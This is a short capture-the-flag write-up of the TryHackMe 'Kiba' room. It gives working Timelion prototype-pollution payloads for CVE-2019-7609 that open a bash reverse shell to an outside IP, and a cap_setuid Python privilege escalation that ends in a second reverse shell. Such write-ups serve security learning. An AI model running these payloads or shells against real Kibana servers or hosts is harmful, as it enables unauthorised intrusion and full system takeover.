---
title: Kiba
description: 'Exploiting Kibana Timelion to get a reverse shell and escalating with cap_setuid in Python'
pubDate: 2023-06-30
category: 'tryhackme'
tags: ['Kibana', 'Timelion', 'cap_setuid+ep']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/ea4429193c0250f0949cec4234d8037b.png'
---

Nmap shows port `5601` is open, this is the default Kibana port and can be accessed in the browser (http://10.10.248.173:5601/app/kibana).

Its version 6.5.4 which is vulnerable to: https://github.com/mpgn/CVE-2019-7609


## USER
```
1. Open Kibana
2. Past one of the following payload into the Timelion visualizer
3. Click run
4. On the left panel click on Canvas
5. Your reverse shell should pop ! :)
```

Payload:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.8.119.137/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

OR

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.8.119.137/4444 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

_Might take some time and going back and forth to the Canvas and Timelion page for the shell to come back_

## ROOT

```bash
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
...[snip]...
```

This means that `/home/kiba/.hackmeplease/python3` can set the uid to 0 (root).

```python
kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3
Python 3.5.2 (default, Oct  8 2019, 13:06:37)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('id')
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
>>> os.system('bash -c "bash -i >& /dev/tcp/10.8.119.137/4444 0>&1"') # To get a reverse shell
```

